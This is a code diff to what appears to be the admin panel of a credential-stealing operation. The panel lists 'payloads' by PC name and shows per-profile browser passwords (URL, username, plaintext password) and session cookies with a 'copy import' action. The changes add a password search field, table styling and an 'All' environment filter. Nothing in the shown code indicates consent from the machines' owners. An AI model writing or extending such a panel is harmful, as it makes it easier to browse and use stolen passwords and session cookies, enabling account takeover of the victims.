@@ -160,7 +160,7 @@ def render_copy_cell(value: str, *, mono: bool = False) -> str:
 
 def render_password_rows(passwords: list[dict[str, Any]]) -> str:
     if not passwords:
-        return '<tr><td colspan="3" class="empty">No passwords for this profile.</td></tr>'
+        return '<tr class="password-empty-row"><td colspan="3" class="empty">No passwords for this profile.</td></tr>'
 
     rows = []
     for entry in passwords:
@@ -168,7 +168,9 @@ def render_password_rows(passwords: list[dict[str, Any]]) -> str:
         username = str(entry.get("username") or "")
         password = resolve_password_value(entry)
         rows.append(
-            "<tr>"
+            "<tr class=\"password-row\" "
+            f'data-url="{html.escape(url.lower(), quote=True)}" '
+            f'data-username="{html.escape(username.lower(), quote=True)}">'
             f'<td class="mono">{html.escape(url) if url else "—"}</td>'
             f"<td>{render_copy_cell(username)}</td>"
             f"<td>{render_copy_cell(password)}</td>"
@@ -210,7 +212,12 @@ def render_record_profiles(content: dict[str, Any]) -> str:
       {render_profile_meta(folder, meta)}
       {cookie_actions}
       <div class="table-wrap">
-        <table>
+        <table class="passwords-table">
+          <colgroup>
+            <col class="col-url">
+            <col class="col-username">
+            <col class="col-password">
+          </colgroup>
           <thead>
             <tr>
               <th>URL</th>
@@ -509,6 +516,39 @@ def render_layout(*, title: str, active_tab: str, content: str, scripts: str = "
       align-items: center;
       margin-bottom: 1rem;
     }}
+    .detail-toolbar {{
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.75rem 1.25rem;
+      align-items: end;
+      margin-bottom: 1rem;
+    }}
+    .detail-toolbar label {{
+      display: grid;
+      gap: 0.35rem;
+      font-size: 0.78rem;
+      color: #9aa3b2;
+    }}
+    .detail-toolbar input[type="search"] {{
+      min-width: 16rem;
+      padding: 0.45rem 0.65rem;
+      border: 1px solid #2a2f3a;
+      border-radius: 6px;
+      background: #151820;
+      color: #e6e8eb;
+      font: inherit;
+    }}
+    .password-search-status {{
+      font-size: 0.82rem;
+      color: #9aa3b2;
+      padding-bottom: 0.45rem;
+    }}
+    .passwords-table {{
+      table-layout: fixed;
+    }}
+    .passwords-table .col-url {{ width: 30%; }}
+    .passwords-table .col-username {{ width: 40%; }}
+    .passwords-table .col-password {{ width: 30%; }}
     .copy-cell {{
       display: flex;
       align-items: center;
@@ -636,7 +676,6 @@ async def admin_records_page() -> HTMLResponse:
 
     scripts = """
   <script>
-    const DEFAULT_ENVIRONMENT = __DEFAULT_ENVIRONMENT__;
     const adminFetch = (url, options = {}) => fetch(url, { credentials: "same-origin", ...options });
     const envFilter = document.getElementById("env-filter");
     const pcFilter = document.getElementById("pc-filter");
@@ -661,20 +700,19 @@ async def admin_records_page() -> HTMLResponse:
     }
 
     async function loadFilters() {
-      const env = envFilter.value || DEFAULT_ENVIRONMENT;
-      const res = await adminFetch(`/admin-credentials/filters?environment=${encodeURIComponent(env)}`);
+      const prevEnv = envFilter.value;
+      const filterParams = prevEnv ? `?environment=${encodeURIComponent(prevEnv)}` : "";
+      const res = await adminFetch(`/admin-credentials/filters${filterParams}`);
       const data = await res.json();
 
-      const prevEnv = envFilter.value;
-      envFilter.innerHTML = "";
-      const envs = data.environments.length ? data.environments : [DEFAULT_ENVIRONMENT];
-      for (const e of envs) {
+      envFilter.innerHTML = '<option value="">All</option>';
+      for (const e of data.environments) {
         const opt = document.createElement("option");
         opt.value = e;
         opt.textContent = e;
         envFilter.appendChild(opt);
       }
-      envFilter.value = envs.includes(prevEnv) ? prevEnv : (envs.includes(DEFAULT_ENVIRONMENT) ? DEFAULT_ENVIRONMENT : envs[0]);
+      envFilter.value = [...envFilter.options].some(o => o.value === prevEnv) ? prevEnv : "";
 
       const prevPc = pcFilter.value;
       pcFilter.innerHTML = '<option value="">All</option>';
@@ -690,7 +728,7 @@ async def admin_records_page() -> HTMLResponse:
     async function loadList(page = currentPage) {
       currentPage = page;
       const params = new URLSearchParams();
-      params.set("environment", envFilter.value || DEFAULT_ENVIRONMENT);
+      if (envFilter.value) params.set("environment", envFilter.value);
       params.set("page", String(currentPage));
       params.set("page_size", String(PAGE_SIZE));
       if (pcFilter.value) params.set("pc_name", pcFilter.value);
@@ -750,12 +788,9 @@ async def admin_records_page() -> HTMLResponse:
 
     (async () => {
       await loadFilters();
-      if (!envFilter.value) envFilter.value = DEFAULT_ENVIRONMENT;
       await loadList(1);
     })();
   </script>"""
-
-    scripts = scripts.replace("__DEFAULT_ENVIRONMENT__", json.dumps(ENVIRONMENT))
 
     return HTMLResponse(render_layout(title="Records", active_tab="records", content=content, scripts=scripts))
 
@@ -797,6 +832,13 @@ async def admin_record_detail(payload_id: int) -> HTMLResponse:
         <a class="button-link" href="/admin-credentials/records">Back to records</a>
       </div>
     </div>
+    <div class="detail-toolbar">
+      <label>
+        Search passwords
+        <input type="search" id="password-search" placeholder="URL or username" autocomplete="off">
+      </label>
+      <span id="password-search-status" class="password-search-status"></span>
+    </div>
     {profiles_html}
   </div>
 
@@ -830,9 +872,54 @@ async def admin_record_detail(payload_id: int) -> HTMLResponse:
     const cookieModalCopyJson = document.getElementById("cookie-modal-copy-json");
     const cookieModalCopyImport = document.getElementById("cookie-modal-copy-import");
     const cookieModalClose = document.getElementById("cookie-modal-close");
+    const passwordSearch = document.getElementById("password-search");
+    const passwordSearchStatus = document.getElementById("password-search-status");
 
     let modalCookies = [];
     let modalImportJson = "";
+
+    function applyPasswordSearch() {{
+      const query = (passwordSearch?.value || "").trim().toLowerCase();
+      let totalRows = 0;
+      let visibleRows = 0;
+
+      document.querySelectorAll(".password-row").forEach((row) => {{
+        totalRows += 1;
+        const haystack = `${{row.dataset.url || ""}} ${{row.dataset.username || ""}}`;
+        const matches = !query || haystack.includes(query);
+        row.hidden = !matches;
+        if (matches) visibleRows += 1;
+      }});
+
+      document.querySelectorAll(".password-empty-row").forEach((row) => {{
+        row.hidden = !!query;
+      }});
+
+      document.querySelectorAll(".profile-panel").forEach((panel) => {{
+        const panelRows = panel.querySelectorAll(".password-row");
+        const panelVisible = [...panelRows].filter((row) => !row.hidden).length;
+        const tab = document.querySelector(`.profile-tab[data-profile="${{panel.dataset.profile}}"]`);
+        if (tab) {{
+          tab.hidden = !!query && panelRows.length > 0 && panelVisible === 0;
+        }}
+        if (panel.classList.contains("active") && tab?.hidden) {{
+          const nextTab = [...document.querySelectorAll(".profile-tab")].find((item) => !item.hidden);
+          if (nextTab) nextTab.click();
+        }}
+      }});
+
+      if (!passwordSearchStatus) return;
+      if (!query) {{
+        passwordSearchStatus.textContent = totalRows ? `${{totalRows}} passwords` : "";
+        return;
+      }}
+      passwordSearchStatus.textContent = totalRows
+        ? `${{visibleRows}} of ${{totalRows}} passwords`
+        : "No passwords";
+    }}
+
+    passwordSearch?.addEventListener("input", applyPasswordSearch);
+    applyPasswordSearch();
 
     profileTabs.forEach((tab) => {{
       tab.addEventListener("click", () => {{
@@ -1401,7 +1488,7 @@ async def admin_errors_page() -> HTMLResponse:
 
 @router.get("/admin-credentials/payloads")
 async def admin_list_payloads(
-    environment: str = Query(default=ENVIRONMENT),
+    environment: str | None = Query(default=None),
     pc_name: str | None = Query(default=None),
     page: int = Query(default=1, ge=1),
     page_size: int = Query(default=20, ge=1, le=100),
@@ -1450,7 +1537,7 @@ async def admin_get_payload(payload_id: int) -> JSONResponse:
 
 
 @router.get("/admin-credentials/filters")
-async def admin_filters(environment: str = Query(default=ENVIRONMENT)) -> JSONResponse:
+async def admin_filters(environment: str | None = Query(default=None)) -> JSONResponse:
     return JSONResponse(
         {
             "environments": list_distinct_environments(),
